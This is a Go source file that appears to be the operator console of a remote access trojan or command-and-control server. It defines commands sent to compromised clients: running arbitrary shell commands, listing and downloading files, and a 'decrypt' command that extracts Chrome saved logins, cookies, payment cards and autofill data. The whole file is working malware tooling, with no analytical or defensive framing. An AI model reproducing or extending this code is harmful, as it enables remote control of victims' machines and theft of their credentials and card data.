package main

import (
	"bufio"
	"fmt"
	"github.com/charmbracelet/log"
	_ "net"
	"os"
	"strconv"
	"strings"
)

type Command struct {
	Name           string
	Description    string
	Args           []string
	RequiredClient bool
	Func           func(args []string) error
}

var commands []Command

func (command *Command) Execute(args []string) {
	if command.RequiredClient && (!selectedClient.Connected || (selectedClient.Conn != nil && !connections[selectedClient.Addr].Connected)) {
		log.Errorf("No client selected or client is disconnected!")
		return
	}

	if selectedClient.Conn != nil {
		client := connections[selectedClient.Addr]

		// update every execution because client can disconnect
		if command.RequiredClient && strings.HasPrefix(selectedClient.Addr, client.Addr) {
			selectedClient = client
		}
	}

	err := command.Func(args)
	if err != nil {
		log.Errorf("Failed to execute command: %v", err)
	}
}

func RegisterCommand(name, description string, args []string, requiredClient bool, function func(args []string) error) {
	command := Command{
		Name:           name,
		Description:    description,
		Args:           args,
		RequiredClient: requiredClient,
		Func:           function,
	}
	commands = append(commands, command)
}

func FindCommandByName(name string) (Command, error) {
	for _, command := range commands {
		if command.Name == name {
			return command, nil
		}
	}
	return Command{}, fmt.Errorf("command %s not found", name)
}

func ParseCommand(commandName string, args []string) {
	command, err := FindCommandByName(commandName)
	if err != nil {
		if commandName == "" {
			return
		}
		log.Errorf("Error while parsing command: %v", err)
		return
	}
	if command.Args != nil && len(args) < len(command.Args) {
		log.Errorf("Missing arguments [%s] for command %s", strings.Join(command.Args[len(args):], ", "), commandName)
		return
	}
	command.Execute(args)
}

func CommandLine() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		scanner.Scan()
		split := strings.Split(scanner.Text(), " ")

		commandName := split[0]
		commandArgs := split[1:]

		ParseCommand(commandName, commandArgs)
	}
}

func RegisterCommands() {
	RegisterCommand("help", "Prints help", []string{}, false, func(args []string) error {
		log.Infof("Available commands:")
		for _, command := range commands {
			if len(command.Args) == 0 {
				log.Infof("%s - %s", command.Name, command.Description)
			} else {
				log.Infof("%s [%s] - %s", command.Name, strings.Join(command.Args, " "), command.Description)
			}
		}
		return nil
	})
	RegisterCommand("exit", "Exits the program", []string{}, false, func(args []string) error {
		log.Info("Exiting...")
		os.Exit(0)
		return nil
	})
	RegisterCommand("cmd", "Executes a command", []string{"command"}, true, func(args []string) error {
		selectedClient.SendData("cmd " + strings.Join(args, " "))
		return nil
	})
	RegisterCommand("connections", "Lists all connections", []string{}, false, func(args []string) error {
		if len(connections) == 0 {
			log.Infof("No connections")
			return nil
		}

		index := 0
		for _, connection := range connections {
			var status string
			if connection.Connected {
				status = "connected"
			} else {
				status = "disconnected"
			}

			log.Infof("[%s] Connection: %s | Status: %s", strconv.Itoa(index), connection.Addr, status)
			index++
		}
		return nil
	})
	RegisterCommand("files", "Lists all files in the current directory", []string{"directory"}, true, func(args []string) error {
		selectedClient.SendData("files " + args[0])
		return nil
	})
	RegisterCommand("download", "Downloads a file", []string{"file"}, true, func(args []string) error {
		selectedClient.SendData("download " + args[0])
		return nil
	})
	RegisterCommand("select", "Selects a connection", []string{"connection"}, false, func(args []string) error {
		index, err := strconv.Atoi(args[0])
		if err != nil || index < 0 || index >= len(connections) {
			return fmt.Errorf("invalid connection index")
		}

		i := 0
		for s := range connections {
			if i != index {
				i++
				continue
			}

			if connections[s].Connected == false {
				return fmt.Errorf("connection is not connected")
			}

			selectedClient = connections[s]
			log.Infof("Selected connection %s", selectedClient.Addr)
			_, _ = SetTitle("Selected connection: " + selectedClient.Addr)
		}

		return nil
	})
	RegisterCommand("clear", "Clears the screen", []string{}, false, func(args []string) error {
		CallClear()
		return nil
	})
	RegisterCommand("decrypt", "Decrypt chrome data", []string{"login, cookies, cards, autofill"}, true, func(args []string) error {
		selectedClient.SendData("decrypt " + args[0])
		return nil
	})
}
